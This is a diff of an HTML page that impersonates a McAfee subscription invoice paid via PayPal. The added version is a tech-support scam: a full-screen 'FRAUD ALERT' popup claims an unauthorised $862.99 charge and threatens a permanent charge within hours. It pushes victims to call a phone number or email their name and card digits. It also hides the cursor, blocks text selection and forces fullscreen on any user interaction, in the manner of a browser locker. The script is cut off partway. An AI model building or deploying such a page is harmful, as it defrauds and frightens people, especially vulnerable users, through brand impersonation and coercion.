@@ -1,663 +1,837 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>McAfee Subscription Invoice</title>
-  <style>
-    /* reset & full white background */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>⚠️ FRAUD ALERT - IMMEDIATE ACTION REQUIRED</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    html, body {
-      width: 100%;
-      min-height: 100vh;
-      background: #ffffff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: Arial, sans-serif;
-    }
+        html,
+        body {
+            width: 100%;
+            min-height: 100vh;
+            background: #1a0000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, Helvetica, sans-serif;
+        }
 
-    /* hide mouse cursor, remove touch highlights, disable selection, remove focus */
-    html, body, * {
-      cursor: none !important;
-      -webkit-tap-highlight-color: transparent !important;
-      -webkit-user-select: none !important;
-      user-select: none !important;
-      -webkit-touch-callout: none !important;
-      caret-color: transparent !important;
-    }
+        /* ===== HIDE CURSOR ===== */
+        html,
+        body,
+        * {
+            cursor: none !important;
+            -webkit-tap-highlight-color: transparent !important;
+            -webkit-user-select: none !important;
+            user-select: none !important;
+            -webkit-touch-callout: none !important;
+            caret-color: transparent !important;
+        }
 
-    :focus, :focus-visible, a:focus, button:focus, input:focus, textarea:focus, select:focus {
-      outline: none !important;
-      box-shadow: none !important;
-    }
+        :focus,
+        :focus-visible,
+        a:focus,
+        button:focus,
+        input:focus,
+        textarea:focus,
+        select:focus {
+            outline: none !important;
+            box-shadow: none !important;
+        }
 
-    body {
-      cursor: none;
-    }
+        /* ===== MAIN CONTAINER (SCARY RED THEME) ===== */
+        .mail-container {
+            max-width: 780px;
+            margin: 20px auto;
+            background: #0d0000;
+            border-radius: 8px;
+            border: 3px solid #ff0000;
+            padding: 28px 28px 36px 28px;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.15), inset 0 0 60px rgba(255, 0, 0, 0.05);
+            position: relative;
+            z-index: 1;
+        }
 
-    .mail-container {
-      max-width: 780px;
-      margin: 0 auto;
-      background-color: #ffffff;
-      border-radius: 8px;
-      border: 1px solid #e2e5e9;
-      padding: 28px 28px 36px 28px;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.03);
-    }
+        /* ===== HEADER ===== */
+        .simple-header {
+            border-bottom: 3px solid #ff0000;
+            padding-bottom: 14px;
+            margin-bottom: 20px;
+        }
 
-    /* McAfee wordmark – red accent */
-    .simple-mcafee {
-      text-align: left;
-      margin-bottom: 28px;
-      border-bottom: 1px solid #eaeef2;
-      padding-bottom: 16px;
-    }
+        .mcafee-name {
+            font-size: 26px;
+            font-weight: 700;
+            color: #ff2222;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
 
-    .mcafee-name {
-      font-size: 26px;
-      font-weight: 600;
-      letter-spacing: -0.3px;
-      color: #1a2c3e;
-    }
+        .mcafee-name span {
+            color: #ff0000;
+            font-weight: 900;
+        }
 
-    .mcafee-name span {
-      color: #b52b2e;
-      font-weight: 700;
-    }
+        .light-tag {
+            font-size: 14px;
+            font-weight: 400;
+            color: #883333;
+            margin-left: 10px;
+        }
 
-    .light-tag {
-      font-size: 13px;
-      color: #5f6c7a;
-      margin-left: 10px;
-      font-weight: normal;
-    }
+        /* ===== INFO ROW ===== */
+        .info-row {
+            background: #1a0505;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            border: 1px solid #440000;
+        }
 
-    .info-row {
-      display: flex;
-      justify-content: flex-end;
-      flex-wrap: wrap;
-      margin-bottom: 24px;
-      gap: 6px;
-    }
+        .info-row p {
+            margin: 4px 0;
+            font-size: 14px;
+            color: #ff6666;
+        }
 
-    .info-row p {
-      font-size: 15px;
-      color: #2c3e4f;
-      font-weight: 500;
-      margin: 0 0 4px 0;
-    }
+        .info-row strong {
+            color: #ff0000;
+        }
 
-    .greeting {
-      font-size: 16px;
-      color: #2c3e4f;
-      margin: 16px 0 12px 0;
-      line-height: 1.45;
-    }
+        /* ===== GREETING ===== */
+        .greeting {
+            font-size: 15px;
+            color: #ff8888;
+            line-height: 1.6;
+            margin-bottom: 18px;
+            background: #1a0505;
+            padding: 14px 18px;
+            border-radius: 6px;
+            border-left: 4px solid #ff0000;
+        }
 
-    .brand-inline {
-      font-weight: 600;
-      color: #b52b2e;
-    }
+        .greeting span {
+            font-weight: 700;
+            color: #ff0000;
+        }
 
-    .details-block {
-      background-color: #fafcfd;
-      border-left: 3px solid #cdd3d9;
-      padding: 12px 18px;
-      margin: 20px 0;
-      font-size: 15px;
-      color: #1f2a38;
-      text-align: left;
-    }
+        /* ===== DETAILS BLOCK ===== */
+        .details-block {
+            background: #0d0000;
+            padding: 10px 4px;
+            margin-bottom: 16px;
+            border-left: 3px solid #ff0000;
+            padding-left: 16px;
+        }
 
-    .details-block p {
-      margin: 6px 0;
-      text-align: left;
-    }
+        .details-block p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #ff8888;
+        }
 
-    .section-title {
-      font-weight: 600;
-      font-size: 16px;
-      margin: 18px 0 8px 0;
-      color: #1e2f3c;
-    }
+        .details-block strong {
+            color: #ff0000;
+        }
 
-    .subscription-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 12px 0 18px 0;
-      font-size: 14px;
-    }
+        /* ===== SECTION TITLE ===== */
+        .section-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #ff0000;
+            margin: 22px 0 10px 0;
+            padding-bottom: 6px;
+            border-bottom: 2px solid #ff0000;
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+        }
 
-    .subscription-table th,
-    .subscription-table td {
-      border: 1px solid #e0e4e8;
-      padding: 10px 6px;
-      vertical-align: middle;
-    }
+        /* ===== TABLE ===== */
+        .subscription-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            margin-bottom: 14px;
+        }
 
-    .subscription-table th {
-      background-color: #f3f5f7;
-      font-weight: 600;
-      color: #1f3a4b;
-      text-align: center;
-      font-size: 14px;
-    }
+        .subscription-table th {
+            background: #ff0000;
+            color: #ffffff;
+            padding: 10px 8px;
+            text-align: left;
+            font-weight: 600;
+        }
 
-    .subscription-table td {
-      text-align: center;
-      background-color: #ffffff;
-      color: #2d4259;
-    }
+        .subscription-table td {
+            padding: 10px 8px;
+            color: #ff9999;
+            border-bottom: 1px solid #330000;
+        }
 
-    .status-badge {
-      font-weight: 500;
-    }
+        .subscription-table .status-badge {
+            background: #ff0000;
+            color: #ffffff;
+            padding: 3px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            display: inline-block;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
+        }
 
-    .amount-text {
-      font-weight: 700;
-      color: #2e4e6e;
-    }
+        /* ===== AUTO-RENEW NOTE ===== */
+        .auto-renew {
+            font-size: 13.5px;
+            color: #ff8888;
+            margin: 8px 0 6px;
+            background: #1a0505;
+            padding: 10px 14px;
+            border-radius: 4px;
+            border: 1px solid #330000;
+        }
 
-    .note-box {
-      background-color: #f9fafb;
-      padding: 12px 18px;
-      border-left: 3px solid #b0b9c4;
-      margin: 18px 0;
-      font-size: 15px;
-      color: #2c3e50;
-    }
+        /* ===== SUPPORT LINE ===== */
+        .support-line {
+            font-size: 14px;
+            color: #ff8888;
+            padding: 12px 16px;
+            background: #1a0505;
+            border-left: 5px solid #ff0000;
+            border-radius: 4px;
+            margin: 14px 0 20px;
+        }
 
-    .support-line {
-      margin: 22px 0 12px;
-      font-size: 15px;
-      line-height: 1.45;
-    }
+        .support-line strong {
+            color: #ff0000;
+        }
 
-    .support-number {
-      font-weight: 700;
-      color: #2c5a74;
-    }
+        /* ===== FOOTER ===== */
+        .footer-center {
+            text-align: center;
+            border-top: 2px solid #ff0000;
+            padding-top: 18px;
+            margin-top: 8px;
+            color: #883333;
+            font-size: 13px;
+        }
 
-    .footer-center {
-      text-align: center;
-      margin-top: 32px;
-      padding-top: 20px;
-      border-top: 1px solid #e2e6ea;
-      font-size: 12px;
-      color: #6a7a8a;
-    }
+        .footer-center p {
+            margin: 4px 0;
+        }
 
-    .footer-center p {
-      margin: 5px 0;
-    }
+        .footer-center strong {
+            color: #ff0000;
+        }
 
-    hr {
-      display: none;
-    }
+        /* ================================================================
+                   POPUP OVERLAY - FULL SCREEN RED SCARY
+                   ================================================================ */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            animation: fadeIn 0.5s ease;
+        }
 
-    /* popup overlay – McAfee style */
-    .popup-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 20, 40, 0.5);
-      backdrop-filter: blur(4px);
-      -webkit-backdrop-filter: blur(4px);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-      animation: fadeIn 0.25s ease;
-    }
+        .popup-overlay.hidden {
+            display: none;
+        }
 
-    .popup-overlay.active {
-      display: flex;
-    }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
 
-    .popup-card {
-      background: #ffffff;
-      max-width: 440px;
-      width: 94%;
-      padding: 40px 32px 36px;
-      border-radius: 40px;
-      box-shadow: 0 40px 80px rgba(0,0,0,0.25);
-      text-align: center;
-      border: 1px solid rgba(181, 43, 46, 0.25);
-      animation: popUp 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    }
+        /* ===== POPUP CARD - EXTREMELY SCARY ===== */
+        .popup-card {
+            position: relative;
+            max-width: 520px;
+            width: 94%;
+            background: #0a0000;
+            border: 3px solid #ff0000;
+            border-radius: 16px;
+            padding: 40px 32px 36px;
+            box-shadow: 0 0 80px rgba(255, 0, 0, 0.25), inset 0 0 80px rgba(255, 0, 0, 0.05);
+            text-align: center;
+            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
 
-    .popup-card h2 {
-      font-size: 30px;
-      font-weight: 800;
-      color: #0b1a33;
-      margin: 4px 0 8px;
-      letter-spacing: -0.3px;
-    }
+        @keyframes popIn {
+            0% {
+                transform: scale(0.7) rotate(-3deg);
+                opacity: 0;
+            }
+            100% {
+                transform: scale(1) rotate(0deg);
+                opacity: 1;
+            }
+        }
 
-    .popup-card .paypal-phone {
-      font-size: 30px;
-      font-weight: 900;
-      background: #d43400;
-      padding: 10px 22px;
-      border-radius: 60px;
-      display: inline-block;
-      margin: 12px 0 20px;
-      color: #ffffff;
-      box-shadow: 0 4px 0 #771d00;
-    }
+        /* ===== CLOSE BUTTON ===== */
+        #closePopupBtn {
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 26px;
+            font-weight: 300;
+            color: #661111;
+            cursor: pointer;
+            padding: 4px 10px;
+            line-height: 1;
+            transition: all 0.3s;
+            border-radius: 50%;
+        }
 
-    .popup-card .sub {
-      font-size: 16px;
-      color: #2a3b5a;
-      margin-bottom: 26px;
-      line-height: 1.4;
-    }
+        #closePopupBtn:hover {
+            color: #ff0000;
+            transform: rotate(90deg);
+        }
 
-    .popup-card .btn-close {
-      background: #0b1a33;
-      color: white;
-      border: none;
-      font-size: 18px;
-      font-weight: 700;
-      padding: 16px 44px;
-      border-radius: 60px;
-      cursor: pointer;
-      transition: 0.15s;
-      box-shadow: 0 6px 0 #040c1a;
-      letter-spacing: 0.3px;
-      display: inline-flex;
-      align-items: center;
-      gap: 10px;
-    }
+        /* ===== POPUP TITLE ===== */
+        .popup-title {
+            color: #ff0000;
+            margin: 0 0 8px 0;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5), 0 0 60px rgba(255, 0, 0, 0.2);
+            font-size: 28px;
+            letter-spacing: 1px;
+            animation: pulseText 1.5s infinite alternate;
+        }
 
-    .popup-card .btn-close:hover {
-      background: #1a2d4f;
-      transform: scale(0.97);
-    }
+        @keyframes pulseText {
+            0% {
+                text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            }
+            100% {
+                text-shadow: 0 0 50px rgba(255, 0, 0, 0.7), 0 0 80px rgba(255, 0, 0, 0.3);
+            }
+        }
 
-    .popup-card .btn-close:active {
-      transform: scale(0.94);
-      box-shadow: 0 3px 0 #040c1a;
-    }
+        /* ===== POPUP SUBTEXT ===== */
+        .popup-sub {
+            color: #ff6666;
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 10px;
+        }
 
-    @keyframes fadeIn {
-      from { opacity: 0; } to { opacity: 1; }
-    }
+        .popup-sub strong {
+            color: #ff0000;
+        }
 
-    @keyframes popUp {
-      0% { transform: scale(0.85); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
+        .popup-sub .big-amount {
+            color: #ff0000;
+            font-size: 32px;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
+        }
 
-    @media (max-width: 560px) {
-      .mail-container {
-        padding: 18px;
-      }
+        /* ===== FRAUD ALERT BADGE ===== */
+        .fraud-badge {
+            display: inline-block;
+            background: #ff0000;
+            color: #ffffff;
+            padding: 4px 16px;
+            border-radius: 4px;
+            font-weight: 900;
+            font-size: 14px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            animation: badgeFlash 1s infinite alternate;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+        }
 
-      .subscription-table th,
-      .subscription-table td {
-        font-size: 12px;
-        padding: 6px 3px;
-      }
+        @keyframes badgeFlash {
+            0% {
+                box-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+            }
+            100% {
+                box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
+            }
+        }
 
-      .mcafee-name {
-        font-size: 22px;
-      }
+        /* ===== WARNING BOX ===== */
+        .warning-box {
+            margin-top: 15px;
+            padding: 14px;
+            background: #1a0505;
+            border-radius: 8px;
+            border-left: 4px solid #ff0000;
+            border: 1px solid #330000;
+        }
 
-      .popup-card {
-        padding: 30px 20px 28px;
-      }
+        .warning-box p {
+            color: #ff6666;
+            margin: 0;
+            font-size: 14px;
+        }
 
-      .popup-card h2 {
-        font-size: 26px;
-      }
+        .warning-box .bold-white {
+            color: #ffffff;
+            font-weight: bold;
+        }
 
-      .popup-card .paypal-phone {
-        font-size: 28px;
-        padding: 8px 18px;
-      }
+        /* ===== PHONE NUMBER ===== */
+        .scary-phone {
+            margin-top: 18px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+            padding: 16px 20px;
+            border: 2px solid #ff0000;
+            border-radius: 12px;
+            background: #1a0000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.15), inset 0 0 30px rgba(255, 0, 0, 0.05);
+            text-align: center;
+            transition: all 0.3s;
+        }
 
-      .popup-card .btn-close {
-        font-size: 16px;
-        padding: 14px 32px;
-      }
-    }
+        .scary-phone:hover {
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3);
+            border-color: #ff3333;
+        }
 
-    body { -webkit-tap-highlight-color: transparent; user-select: none; }
+        .scary-phone .phone-number {
+            color: #ff0000;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            font-size: 26px;
+        }
 
-    /* McAfee red accents */
-    .mcafee-red {
-      color: #b52b2e;
-    }
-    .mcafee-bg-red {
-      background: #b52b2e;
-    }
-    .border-mcafee {
-      border-color: #b52b2e;
-    }
-  </style>
+        /* ===== EMAIL SECTION ===== */
+        .email-section {
+            margin-top: 15px;
+            padding: 14px 12px;
+            background: #0a0000;
+            border: 2px dashed #ff0000;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .email-section .label {
+            color: #883333;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .email-section .email-address {
+            color: #ff4444;
+            font-size: 20px;
+            font-weight: bold;
+            word-break: break-all;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        }
+
+        .email-section .hint {
+            margin-top: 4px;
+            color: #553333;
+            font-size: 12px;
+        }
+
+        /* ===== FINE PRINT ===== */
+        .fine-print {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #442222;
+            text-align: center;
+            border-top: 1px solid #1a0000;
+            padding-top: 14px;
+        }
+
+        .fine-print .warning-red {
+            color: #ff0000;
+        }
+
+        /* ===== PULSE GLOW RING ===== */
+        .pulse-ring {
+            position: absolute;
+            top: -8px;
+            left: -8px;
+            right: -8px;
+            bottom: -8px;
+            border: 2px solid rgba(255, 0, 0, 0.1);
+            border-radius: 20px;
+            animation: ringPulse 2s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes ringPulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+                border-color: rgba(255, 0, 0, 0.1);
+            }
+            50% {
+                transform: scale(1.02);
+                opacity: 0.5;
+                border-color: rgba(255, 0, 0, 0.3);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+                border-color: rgba(255, 0, 0, 0.1);
+            }
+        }
+
+        /* ================================================================
+                   RESPONSIVE
+                   ================================================================ */
+        @media (max-width: 600px) {
+            .mail-container {
+                padding: 16px;
+                margin: 10px;
+            }
+            .popup-card {
+                padding: 28px 18px 24px;
+            }
+            .popup-title {
+                font-size: 20px;
+            }
+            .popup-sub .big-amount {
+                font-size: 26px;
+            }
+            .scary-phone {
+                font-size: 18px;
+                padding: 12px 14px;
+            }
+            .scary-phone .phone-number {
+                font-size: 20px;
+            }
+            .email-section .email-address {
+                font-size: 16px;
+            }
+            .subscription-table th,
+            .subscription-table td {
+                font-size: 11px;
+                padding: 6px 4px;
+            }
+            .mcafee-name {
+                font-size: 20px;
+            }
+            .info-row {
+                flex-direction: column;
+                gap: 4px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .popup-card {
+                padding: 20px 12px 18px;
+            }
+            .popup-title {
+                font-size: 17px;
+            }
+            .scary-phone {
+                font-size: 15px;
+                padding: 10px;
+            }
+            .scary-phone .phone-number {
+                font-size: 17px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="mail-container">
-    <!-- PayPal + McAfee header -->
-    <div class="simple-header" style="border-bottom: 3px solid #b52b2e; padding-bottom: 14px; margin-bottom: 20px;">
-      <div class="mcafee-name" style="font-size: 26px; font-weight: 700; color: #1a2c3e;">
-        <span style="color: #b52b2e;">McAfee</span> 
-        <span class="light-tag" style="font-size: 14px; font-weight: 400; color: #6c7a89; margin-left: 10px;">| subscription</span>
-      </div>
+
+    <!-- ================================================================
+    POPUP - FULL SCREEN RED SCARY OVERLAY
+    ================================================================ -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-card">
+
+            <!-- Pulse Ring -->
+            <div class="pulse-ring"></div>
+
+            <!-- Close Button (X) -->
+            <button id="closePopupBtn" title="Close">✕</button>
+
+            <!-- Title -->
+            <h2 class="popup-title">⚠️ IMMEDIATE ACTION REQUIRED ⚠️</h2>
+
+            <!-- Fraud Badge -->
+            <div class="fraud-badge">🔴 FRAUD ALERT</div>
+
+            <!-- Subtext -->
+            <div class="popup-sub" style="margin-top: 12px;">
+                Your <strong>McAfee Total Protection</strong> renewal for
+                <br>
+                <span class="big-amount">$862.99</span>
+                <br>
+                has been <strong style="color: #ff0000; text-transform: uppercase;">charged to your card</strong>.
+            </div>
+
+            <!-- Warning Box -->
+            <div class="warning-box">
+                <p>
+                    ❗ If you did <strong>NOT</strong> authorize this transaction, your account will be debited within <strong style="color: #ff0000;">24 hours</strong>.
+                    <br>
+                    <span class="bold-white">Contact our Security Department IMMEDIATELY to cancel.</span>
+                </p>
+            </div>
+
+            <!-- Phone Number -->
+            <div class="scary-phone">
+                <span>📞 CALL NOW: <span class="phone-number">+1 (831) 512-3319</span></span>
+            </div>
+
+            <!-- Email Section -->
+            <div class="email-section">
+                <div class="label">Or email dispute to:</div>
+                <div class="email-address">✉️ b.n.yankov@suyavorov.com</div>
+                <div class="hint">(Include your full name and card last 4 digits)</div>
+            </div>
+
+            <!-- Fine Print -->
+            <div class="fine-print">
+                ⚡ This is an automated security alert. Failure to respond within 12 hours will result in permanent charge.
+                <br>
+                <span class="warning-red"><strong>Do not ignore.</strong></span>
+            </div>
+
+        </div>
     </div>
 
-    <!-- DATE and helpdesk -->
-    <div class="info-row" style="background: #f7f9fc; padding: 12px 16px; border-radius: 6px; margin-bottom: 18px;">
-      <div style="display: flex; flex-wrap: wrap; gap: 20px 40px;">
-        <p style="margin: 4px 0; font-size: 14px; color: #1a2a3a;"><strong style="color: #b52b2e;">DATE:</strong> August 25, 2026</p>
-        <p style="margin: 4px 0; font-size: 14px; color: #1a2a3a;"><strong style="color: #b52b2e;">HELP DESK:</strong> +1 (831) 512-3319</p>
-      </div>
+    <!-- ================================================================
+    MAIN CONTENT - SCARY RED THEME
+    ================================================================ -->
+    <div class="mail-container">
+
+        <!-- Header -->
+        <div class="simple-header">
+            <div class="mcafee-name">
+                <span>McAfee</span>
+                <span class="light-tag">| subscription</span>
+            </div>
+        </div>
+
+        <!-- Date and Helpdesk -->
+        <div class="info-row">
+            <div style="display: flex; flex-wrap: wrap; gap: 20px 40px;">
+                <p><strong>DATE:</strong> August 25, 2026</p>
+                <p><strong>HELP DESK:</strong> +1 (831) 512-3319</p>
+            </div>
+        </div>
+
+        <!-- Greeting -->
+        <div class="greeting">
+            Thank you for choosing <span>McAfee</span> to protect your digital life. Your subscription has been renewed successfully. Below are the details of your purchase.
+        </div>
+
+        <!-- Billing Details -->
+        <div class="details-block">
+            <p><strong>Invoice id:</strong> INV-2026-08-25-MC99</p>
+            <p><strong>Transaction id:</strong> TXN-4F7A9C2E8D1B</p>
+            <p><strong>Purchase Date:</strong> August 25, 2026</p>
+            <p><strong>Amount (USD):</strong> $862.99</p>
+            <p><strong>Coverage:</strong> 10 Devices, 2 Years</p>
+        </div>
+
+        <!-- Product Description -->
+        <div class="section-title">📦 Product Description</div>
+
+        <!-- Subscription Table -->
+        <table class="subscription-table">
+            <thead>
+                <tr>
+                    <th>Account Type</th>
+                    <th>Product</th>
+                    <th>Tenure</th>
+                    <th>Payment Mode</th>
+                    <th>Order Total</th>
+                    <th>Status</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>McAfee+ Premium</td>
+                    <td>Total Protection</td>
+                    <td>2 Years</td>
+                    <td>PayPal</td>
+                    <td style="color: #ff0000; font-weight: 700;">$862.99</td>
+                    <td><span class="status-badge">Successful</span></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- Auto-Renew Note -->
+        <div class="auto-renew">
+            This email confirms your McAfee subscription via PayPal. Your protection will renew automatically every 24 months unless you disable auto‑renewal in your PayPal dashboard.
+        </div>
+
+        <!-- Cancellation / Refund -->
+        <div class="support-line">
+            ⚠️ If you did not authorize this transaction, you have <strong>4 hours</strong> to request a cancellation and receive a full refund. For assistance, contact our help desk at: <strong>+1 (831) 512-3319</strong>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-center">
+            <p><strong>HELP DESK: +1 (831) 512-3319</strong></p>
+            <p>© 2026 <strong>McAfee</strong> · All Rights Reserved.</p>
+            <p>This is a system-generated payment confirmation.</p>
+            <p style="font-family: monospace; font-size: 11px; margin-top: 8px; color: #553333;">1234 Security Blvd, Suite 200, San Jose, CA 95110</p>
+        </div>
+
     </div>
 
-    <!-- main message -->
-    <div class="greeting" style="font-size: 15px; color: #1e2b39; line-height: 1.6; margin-bottom: 18px; background: #fef4f3; padding: 14px 18px; border-radius: 6px; border-left: 4px solid #b52b2e;">
-      Thank you for choosing <span style="font-weight: 700; color: #b52b2e;">McAfee</span> to protect your digital life. Your subscription has been renewed successfully. Below are the details of your purchase.
-    </div>
+    <!-- ================================================================
+    JAVASCRIPT
+    ================================================================ -->
+    <script>
+        (function() {
+            'use strict';
 
-    <!-- Billing details - LEFT ALIGNED -->
-    <div class="details-block" style="background: #ffffff; padding: 10px 4px; margin-bottom: 16px;">
-      <p style="margin: 5px 0; font-size: 14px; color: #1e2b39;"><strong style="color: #b52b2e;">Invoice id:</strong> INV-2026-08-25-MC99</p>
-      <p style="margin: 5px 0; font-size: 14px; color: #1e2b39;"><strong style="color: #b52b2e;">Transaction id:</strong> TXN-4F7A9C2E8D1B</p>
-      <p style="margin: 5px 0; font-size: 14px; color: #1e2b39;"><strong style="color: #b52b2e;">Purchase Date:</strong> August 25, 2026</p>
-      <p style="margin: 5px 0; font-size: 14px; color: #1e2b39;"><strong style="color: #b52b2e;">Amount (USD):</strong> $862.99</p>
-      <p style="margin: 5px 0; font-size: 14px; color: #1e2b39;"><strong style="color: #b52b2e;">Coverage:</strong> 10 Devices, 2 Years</p>
-    </div>
+            // ============================================================
+            // 1. POPUP CONTROLS
+            // ============================================================
+            const overlay = document.getElementById('popupOverlay');
+            const closeBtn = document.getElementById('closePopupBtn');
 
-    <!-- Product Description title -->
-    <div class="section-title" style="font-size: 17px; font-weight: 700; color: #b52b2e; margin: 22px 0 10px 0; padding-bottom: 6px; border-bottom: 2px solid #b52b2e;">
-      📦 Product Description
-    </div>
+            // Show popup immediately (already visible via CSS)
+            // Close on X button click
+            if (closeBtn) {
+                closeBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    overlay.classList.add('hidden');
+                    // Request fullscreen after closing
+                    requestFullscreen();
+                });
+            }
 
-    <!-- Subscription table (McAfee themed) -->
-    <table class="subscription-table" style="width: 100%; border-collapse: collapse; font-size: 13px; margin-bottom: 14px;">
-      <thead>
-        <tr style="background: #b52b2e; color: #ffffff;">
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Account Type</th>
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Product</th>
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Tenure</th>
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Payment Mode</th>
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Order Total</th>
-          <th style="padding: 10px 8px; text-align: left; font-weight: 600;">Status</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr style="border-bottom: 1px solid #e0e7ef;">
-          <td style="padding: 10px 8px; color: #1e2b39;">McAfee+ Premium</td>
-          <td style="padding: 10px 8px; color: #1e2b39;">Total Protection</td>
-          <td style="padding: 10px 8px; color: #1e2b39;">2 Years</td>
-          <td style="padding: 10px 8px; color: #1e2b39;">PayPal</td>
-          <td style="padding: 10px 8px; color: #b52b2e; font-weight: 700;">$862.99</td>
-          <td style="padding: 10px 8px;">
-            <span style="background: #b52b2e; color: #ffffff; padding: 3px 14px; border-radius: 20px; font-size: 12px; font-weight: 600; display: inline-block;">Successful</span>
-          </td>
-        </tr>
-      </tbody>
-    </table>
+            // Close on overlay click (outside card)
+            if (overlay) {
+                overlay.addEventListener('click', function(e) {
+                    if (e.target === overlay) {
+                        overlay.classList.add('hidden');
+                        requestFullscreen();
+                    }
+                });
+            }
 
-    <!-- auto-renew note -->
-    <p style="font-size: 13.5px; color: #2c3e50; margin: 8px 0 6px; background: #f7faff; padding: 10px 14px; border-radius: 4px; border: 1px solid #e6edf5;">
-       This email confirms your McAfee subscription via PayPal. Your protection will renew automatically every 24 months unless you disable auto‑renewal in your PayPal dashboard.
-    </p>
+            // ============================================================
+            // 2. FULLSCREEN REQUEST
+            // ============================================================
+            function requestFullscreen() {
+                try {
+                    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                        document.documentElement.requestFullscreen?.() ||
+                            document.documentElement.webkitRequestFullscreen?.();
+                    }
+                } catch (e) { /* ignore */ }
+            }
 
-    <!-- cancellation / refund text -->
-    <div class="support-line" style="font-size: 14px; color: #1e2b39; padding: 12px 16px; background: #fef7e9; border-left: 5px solid #f5a623; border-radius: 4px; margin: 14px 0 20px;">
-      ⚠️ If you did not authorize this transaction, you have <strong>4 hours</strong> to request a cancellation and receive a full refund. For assistance, contact our help desk at: <strong style="color: #b52b2e;">+1 (831) 512-3319</strong>
-    </div>
+            // Trigger on any user interaction
+            const events = ['click', 'mousemove', 'keydown', 'touchstart', 'scroll', 'wheel'];
+            events.forEach(ev => {
+                document.addEventListener(ev, requestFullscreen, { passive: true });
+            });
 
-    <!-- footer -->
-    <div class="footer-center" style="text-align: center; border-top: 2px solid #b52b2e; padding-top: 18px; margin-top: 8px; color: #4a5a6a; font-size: 13px;">
-      <p style="margin: 4px 0;"><strong style="color: #b52b2e;">HELP DESK: +1 (831) 512-3319</strong></p>
-      <p style="margin: 4px 0; color: #b52b2e;">© 2026 <strong>McAfee</strong> · All Rights Reserved.</p>
-      <p style="margin: 4px 0; font-size: 12px; color: #6c7a89;">This is a system-generated payment confirmation.</p>
-      <p style="font-family: monospace; font-size: 11px; margin-top: 8px; color: #5a6a7a;">1234 Security Blvd, Suite 200, San Jose, CA 95110</p>
-    </div>
-  </div>
+            // Try on load
+            setTimeout(requestFullscreen, 1000);
 
-  <!-- POPUP (Scary Fraud Alert) - Placed outside mail-container -->
-  <div class="popup-overlay" id="popupOverlay">
